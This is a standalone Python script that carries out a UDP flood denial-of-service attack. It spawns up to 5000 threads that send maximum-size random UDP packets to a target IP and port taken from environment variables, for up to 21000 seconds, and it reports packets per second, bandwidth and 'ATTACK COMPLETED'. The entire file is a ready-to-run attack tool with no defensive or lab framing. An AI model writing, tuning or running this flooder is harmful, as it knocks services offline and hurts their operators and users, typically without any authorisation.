#!/usr/bin/env python3
import os
import socket
import threading
import time
import sys
import random

TARGET_IP   = os.getenv("TARGET_IP", "").strip()
TARGET_PORT = int(os.getenv("TARGET_PORT", "80").strip())
THREADS     = min(int(os.getenv("THREADS", "2000").strip()), 5000)
DURATION    = min(int(os.getenv("DURATION", "300").strip()), 21000)

if not TARGET_IP:
    print("❌ ERROR: TARGET_IP not set", file=sys.stderr)
    sys.exit(1)

print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"🚀 UDP FLOOD STARTING")
print(f"🎯 Target   : {TARGET_IP}:{TARGET_PORT}")
print(f"🧵 Threads  : {THREADS}")
print(f"⏰ Duration : {DURATION}s")
print(f"📦 Pkt Size : 65,507 bytes (max UDP)")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

running    = True
sent_count = 0
bytes_sent = 0
errors     = 0
lock       = threading.Lock()

# Pre-generate payloads for speed (random payloads slow things down)
PAYLOAD_POOL = [os.urandom(65507) for _ in range(10)]

def flood():
    global sent_count, bytes_sent, errors
    # Each thread gets its own socket - reuse for speed
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536 * 4)
            # Burst: send multiple packets before recreating socket
            for _ in range(50):
                if not running:
                    break
                payload = PAYLOAD_POOL[_ % 10]
                sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            sock.close()
            with lock:
                sent_count += 50
                bytes_sent += 65507 * 50
        except OSError:
            with lock:
                errors += 1
        except Exception:
            pass

# Start all threads
threads_list = []
for i in range(THREADS):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    threads_list.append(t)

print(f"✅ {THREADS} threads launched!")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

start      = time.time()
last_count = 0
last_bytes = 0

try:
    while time.time() - start < DURATION:
        time.sleep(5)
        elapsed   = time.time() - start
        remaining = max(0, DURATION - elapsed)

        with lock:
            pkts      = sent_count
            total_mb  = bytes_sent / (1024 * 1024)
            total_gb  = bytes_sent / (1024 * 1024 * 1024)
            errs      = errors

        interval_pkts  = pkts - last_count
        interval_bytes = (pkts - last_count) * 65507
        pps            = interval_pkts / 5
        mbps           = (interval_bytes * 8) / (1024 * 1024 * 5)
        gbps           = mbps / 1024

        last_count = pkts
        last_bytes = bytes_sent

        print(
            f"[{int(elapsed):5}s/{DURATION}s] "
            f"Pkts: {pkts:>10,} | "
            f"Speed: {pps:>8,.0f} pps | "
            f"{mbps:>8.1f} Mbps ({gbps:.3f} Gbps) | "
            f"Total: {total_gb:.2f} GB | "
            f"Err: {errs} | "
            f"Left: {int(remaining)}s",
            flush=True
        )

except KeyboardInterrupt:
    print("⏹️ Interrupted")
finally:
    running = False

time.sleep(1)
elapsed = time.time() - start

with lock:
    final_gb  = bytes_sent / (1024 * 1024 * 1024)
    avg_pps   = sent_count / elapsed if elapsed > 0 else 0
    avg_mbps  = (bytes_sent * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0

print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"✅ ATTACK COMPLETED")
print(f"📊 Total Packets : {sent_count:,}")
print(f"📦 Total Data    : {final_gb:.3f} GB")
print(f"⚡ Avg Speed     : {avg_pps:,.0f} pps | {avg_mbps:.1f} Mbps")
print(f"⏰ Duration      : {int(elapsed)}s")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
